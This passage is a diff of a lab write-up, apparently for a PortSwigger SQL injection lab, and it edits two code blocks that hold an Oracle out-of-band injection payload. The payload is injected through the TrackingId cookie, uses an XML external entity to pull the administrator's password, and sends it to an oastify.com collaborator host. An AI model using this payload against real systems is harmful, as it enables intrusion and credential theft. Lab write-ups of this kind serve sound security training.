@@ -64,7 +64,7 @@ Out-of-Band SQL Injection with data exfiltration is considered extremely dangero
 5. Using the PortSwigger SQL Injection cheat sheet, craft the following payload:
 
 ```sql
-' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.4kplfsxi45y92ldn6rswmn5w8nee25qu.oastify.com/"> %remote;]>'),'/l') FROM dual--;
+TrackingId=' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.4kplfsxi45y92ldn6rswmn5w8nee25qu.oastify.com/"> %remote;]>'),'/l') FROM dual--;
 ```
 
 6. Send the modified request.
@@ -108,7 +108,7 @@ During inspection, the vulnerable `TrackingId` cookie was identified.
 Using the PortSwigger SQL Injection cheat sheet, the following Oracle payload was crafted and modified:
 
 ```sql
-' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.4kplfsxi45y92ldn6rswmn5w8nee25qu.oastify.com/"> %remote;]>'),'/l') FROM dual--;
+TrackingId=' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.4kplfsxi45y92ldn6rswmn5w8nee25qu.oastify.com/"> %remote;]>'),'/l') FROM dual--;
 ```
 
 This payload:
